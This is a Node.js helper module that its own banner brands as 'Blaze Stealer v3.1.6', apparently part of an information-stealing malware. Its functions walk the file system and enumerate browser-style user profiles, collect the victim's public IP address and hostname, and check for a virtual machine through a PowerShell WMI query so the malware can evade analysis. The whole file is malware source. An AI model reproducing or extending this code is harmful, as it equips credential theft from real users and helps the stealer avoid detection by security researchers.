const fs = require('fs');
const axios = require("axios");
const util = require('util');
const exec = util.promisify(require('child_process').exec);

function generateId(len) {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < len; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}

function fileName(str) {
    return str.split('\\').pop().split('/').pop();
}

function recursiveRead(basepath, path) {
    var result = [];
    if (!basepath.endsWith("\\")) {
        basepath += "\\";
    }
    const files = fs.readdirSync(basepath);
    for (var i = 0; i < files.length; i++) {
        const file = files[i];
        const filePath = basepath + file;
        if (fs.statSync(filePath).isDirectory()) {
            result = result.concat(recursiveRead(filePath, path + file + "\\"));
        } else {
            result.push(path + file);
        }
    }
    return result;
}

function getProfiles(path, name) {
    const profile = path.split("%PROFILE%");
    if (profile.length == 1) {
        return [{
            path: path,
            name: name
        }];
    }

    if (!fs.existsSync(profile[0])) {
        return [];
    }

    var dirs = fs.readdirSync(profile[0]);
    var profiles = [];
    for (var i = 0; i < dirs.length; i++) {
        var dir = dirs[i];
        if (fs.existsSync(profile[0] + dir + profile[1])) {
            profiles.push({
                "path": profile[0] + dir + profile[1],
                "profile": name + " " + dir
            });
        }
    }

    return profiles;
}

async function getPublicIp() {
    var ip = ""
    try {
        const res = await axios({
            url: "https://api.ipify.org",
            method: "GET"
        })
        ip = res.data
        if (ip.length > 16) {
            return "Failed!"
        }
        return ip
    } catch (err) {
        return "Failed!"
    }
}

async function getHostname() {
    const { stdout, _ } = await exec('hostname');
    return stdout.replace("\r\n", "")
}

async function isVm() {
    const { stdout, _} = await exec("powershell -c \"Get-WmiObject -Query \\\"Select * from Win32_CacheMemory\\\"\"")
    if (stdout.replace(/\r/gm, "").replace(/\n/gm, "").replace(/ /gm, "") == "") {
        return true
    }
    return false
}

function getHeader() {
    return "\n                               &/\n                             #&&//\n                             ##&&%//\n                             ##%&&(((\n                /           ###%%%@((\n         #    ,,(          #####%%@(((  %\n     %%(.   ,,,//         (####%%%@((( %%\n    #   ,,,,,,//            (##%%%###%%%%\n     ,,,,,,,////*        (((((%%%%#%%%%%%\n    ,,,,,,,,,,////////(((((((#%%%%%%%%%%\n    ,,,,     ,,,,///////((((#%%%%#(%%%%\n    ,,      ,, ,,,,///////(#((((((%%%%\n     .     .,,,,,,,,////////(((((%#%%\n           ,,,,,,**///////&.//((###     &\n           ,,,,******//#,,,///##     ,##\n           ,,,,*****&,,,.  #      (((##/\n           ,,,*******,        /(((%%%&\n           ,,,***/**        /%%\n            ,,****\n             ,,***   𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝙗𝙮 𝘽𝙡𝙖𝙯𝙚𝙄𝙣𝙘\n               ,*    𝘽𝙡𝙖𝙯𝙚 𝙎𝙩𝙚𝙖𝙡𝙚𝙧 𝙫𝟯.𝟭.𝟲\n┎───────────────────────────────────────────┚"
}


module.exports = {
    generateId,
    fileName,
    recursiveRead,
    getProfiles,
    getPublicIp,
    getHostname,
    isVm,
    getHeader
}